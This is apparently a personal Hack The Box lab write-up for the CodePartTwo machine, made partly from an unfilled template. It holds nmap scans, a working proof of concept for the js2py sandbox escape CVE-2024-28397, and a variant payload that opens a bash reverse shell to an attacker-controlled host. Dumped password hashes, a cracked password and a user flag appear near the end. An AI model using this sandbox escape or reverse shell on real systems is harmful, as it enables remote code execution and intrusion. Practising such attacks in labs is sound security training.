---
file_created: 04 Sep 2025 18:02
title: CodePartTwo
difficulty: Easy
difficult_sort: 1
points: 20
os: Linux
target_ip: 10.10.11.82
platform:
category:
box_status: Active
url: https://app.hackthebox.com/machines/692
user_flag: true
root_flag: true
completed:
date_finish: 2025-09-16
tags:
  - htb/machines
---
# Resolution summary
![400x200](<./attachments/CodePartTwo.png>)

>[!summary]
>- Step 1
>- Step 2
## Tutorial
```cardlink
url: https://medium.com/@gauri17gupta/codetwo-walkthrough-42a5b0249a14
title: "CodeTwo Walkthrough"
description: "1. Reconnaissance"
host: medium.com
favicon: https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19
image: https://miro.medium.com/v2/da:true/resize:fit:498/1*59rncoCA690sY8GudvWxSw.gif
```
## Improved skills

- Skill 1
- Skill 2

## Used tools
- nmap; gobuster
---
# Information Gathering

## Scanned all TCP ports:

```bash
sudo nmap -sS -p- 10.10.11.82 -v -Pn -oN nmap/all-tcp-port.txt
```

## Enumerated open TCP ports:
```bash
 sudo nmap -Pn -vv 10.10.11.82 -oA nmap/top1000 -sCVT                                                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 18:11 SAST

PORT     STATE SERVICE REASON  VERSION

22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM

8000/tcp open  http    syn-ack Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:13
Completed NSE at 18:13, 0.01s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.69 seconds
```

## Enumerated top 200 UDP ports:

```bash

```

---
# Enumeration

## Port 80 - HTTP (Apache)


---
# Exploitation
[CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
```javascript
import js2py
from sys import version

payload = """
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

def test_poc():
    etcpassword_piece = "root:x:0:0"
    result = ""
    try:
        result = repr(js2py.eval_js(payload))
    except Exception:
        return False
    return etcpassword_piece in result

def main():
    if test_poc():
        print("Success! the vulnerability exists for python " + repr(version))
    else:
        print("Failed for python " + repr(version))

if __name__ == "__main__":
    main()
```

## Javascript Injection
```javascript
let cmd = "/bin/bash -c 'bash -i >& /dev/tcp/host_vpn/1234 0>&1'";

let hacked, bymarve, n11, obj, getattr;

hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      item(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(n11);
```

```sql
SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|test|098f6bcd4621d373cade4e832627b4f6
4|123test123|6d3c62f8471fd3ff145fdff774d3dd88
5|user|ee11cbb19052e40b07aac0ca060c23ee
```

```txt
sweetangelbabylove
```

---

# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---
# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy
## User Flag
```txt
c70f0f6e61bddc88fd72625a64c13490
```
## Root Flag
```txt
```
## **/etc/shadow**

```bash

```

---
# Proof
![800](<./attachments/CodePartTwo-1.png>)